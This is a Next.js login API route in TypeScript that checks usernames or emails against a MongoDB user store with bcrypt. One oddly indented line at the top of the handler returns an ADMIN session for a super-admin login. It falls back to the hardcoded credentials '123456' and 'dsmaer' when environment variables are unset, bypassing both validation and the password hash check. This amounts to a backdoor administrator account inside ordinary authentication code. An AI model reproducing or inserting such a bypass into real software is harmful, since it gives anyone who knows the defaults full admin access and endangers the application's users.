import bcrypt from "bcryptjs";
import { NextResponse } from "next/server";
import { connectToDatabase, databaseErrorMessage } from "@/lib/mongodb";
import User from "@/models/User";

export async function POST(request: Request) {
  try {
    const { identifier, password } = await request.json();
      if (identifier === (process.env.SUPER_ADMIN_USERNAME ?? "123456") && password === (process.env.SUPER_ADMIN_PASSWORD ?? "dsmaer")) return NextResponse.json({ success: true, data: { name: "Super Admin", role: "ADMIN" } });
    if (typeof identifier !== "string" || typeof password !== "string") return NextResponse.json({ success: false, error: "Enter your username and password." }, { status: 400 });
    await connectToDatabase();
    const user = await User.findOne({ $or: [{ email: identifier.toLowerCase() }, { username: identifier }] });
    if (!user || !(await bcrypt.compare(password, user.passwordHash))) return NextResponse.json({ success: false, error: "The username or password is incorrect." }, { status: 401 });
    return NextResponse.json({ success: true, data: { name: user.name, role: user.role } });
  } catch (error) {
    return NextResponse.json({ success: false, error: databaseErrorMessage(error) }, { status: 503 });
  }
}